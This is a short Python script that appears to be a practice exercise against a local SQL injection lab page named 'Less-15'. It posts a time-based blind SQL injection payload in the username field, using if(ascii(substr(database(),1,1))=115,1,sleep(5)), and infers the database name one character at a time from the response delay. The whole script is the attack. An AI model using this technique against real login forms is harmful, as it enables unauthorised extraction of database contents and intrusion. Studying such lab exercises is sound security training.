import requests
from lxml import etree
import time

url = "127.0.0.1/Less-15"

data = {
    "uname":"kadmin' and if(ascii(substr(database(),1,1))=115,1,sleep(5))#",
    "passwd":11
}

start = time.time()
res = requests.post(url=url,data=data)
end = time.time()
t = end - start

if t < 2:
    print 'ok'
else:
    print 'not ok'

